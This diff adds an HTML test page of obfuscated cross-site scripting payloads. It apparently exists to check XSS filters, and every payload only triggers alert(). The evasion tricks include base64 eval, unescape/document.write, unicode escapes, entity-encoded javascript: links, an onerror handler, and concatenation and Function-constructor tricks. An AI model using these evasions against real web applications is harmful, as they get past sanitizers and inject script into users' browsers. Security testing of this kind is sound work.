@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Obfuscated Scripts & Payload Evasion Test</title>
+</head>
+<body>
+    <h1>Obfuscated Script Execution Payloads</h1>
+
+    <!-- 1. Base64 encoded payload with eval & atob -->
+    <script>eval(atob('YWxlcnQoJ1hTUyBPYmZ1c2NhdGVkIEJhc2U2NCcp'));</script>
+
+    <!-- 2. Hex encoded script via document.write & unescape -->
+    <script>document.write(unescape('%3Cscript%3Ealert%28%27Hex%20Encoded%20XSS%27%29%3C/script%3E'));</script>
+
+    <!-- 3. Unicode escape sequences -->
+    <script>\u0061\u006c\u0065\u0072\u0074('Unicode Escaped XSS');</script>
+
+    <!-- 4. HTML Entity obfuscation in event handlers & href -->
+    <a href="j&#x61;vascript:alert('HTML Entity Obfuscation')">Click Here for Obfuscated Link</a>
+    <a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">Full Entity Encoded Protocol</a>
+
+    <!-- 5. Obfuscated Inline Handler -->
+    <img src="x" onerror="&#0000097;lert('Decimal Entity Handler')">
+
+    <!-- 6. Nested String Concatenation & Constructor Evasion -->
+    <script>window['al'+'ert']('Concatenated Method');</script>
+    <script>Function("ale"+"rt(1)")();</script>
+</body>
+</html>
